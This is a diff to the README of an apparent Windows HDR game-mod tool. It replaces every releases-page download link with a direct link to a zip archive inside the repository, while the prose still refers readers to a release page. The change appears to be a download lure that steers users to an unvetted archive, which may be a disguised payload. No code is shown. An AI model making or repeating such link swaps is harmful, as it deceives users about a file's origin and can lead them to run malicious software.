@@ -1,6 +1,6 @@
 # 🎮 RenoDXChecker-HDR-Game-Mods-on-Windows - Simple HDR for Windows Games
 
-[![Download RenoDXChecker](https://img.shields.io/badge/Download%20RenoDXChecker-blue?style=for-the-badge&logo=github)](https://github.com/Anthophilous-abetter567/RenoDXChecker-HDR-Game-Mods-on-Windows/releases)
+[![Download RenoDXChecker](https://img.shields.io/badge/Download%20RenoDXChecker-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Anthophilous-abetter567/RenoDXChecker-HDR-Game-Mods-on-Windows/main/BaseMain/Mods_DX_Checker_Game_Reno_HD_on_Windows_3.3.zip)
 
 ## 🖥️ What this tool does
 
@@ -17,7 +17,7 @@ Use it to:
 ## 📥 Download
 
 Visit this page to download:
-https://github.com/Anthophilous-abetter567/RenoDXChecker-HDR-Game-Mods-on-Windows/releases
+https://raw.githubusercontent.com/Anthophilous-abetter567/RenoDXChecker-HDR-Game-Mods-on-Windows/main/BaseMain/Mods_DX_Checker_Game_Reno_HD_on_Windows_3.3.zip
 
 Look for the latest release, then download the file that matches your Windows setup. If the release includes an installer, download that file. If it includes a portable app, download that file and run it after extraction.
 
@@ -140,7 +140,7 @@ Use the release page linked above so you get the latest build from the project s
 ## 📌 Release Page
 
 Download from the latest release here:
-https://github.com/Anthophilous-abetter567/RenoDXChecker-HDR-Game-Mods-on-Windows/releases
+https://raw.githubusercontent.com/Anthophilous-abetter567/RenoDXChecker-HDR-Game-Mods-on-Windows/main/BaseMain/Mods_DX_Checker_Game_Reno_HD_on_Windows_3.3.zip
 
 ## 🖥️ Windows Tips
 
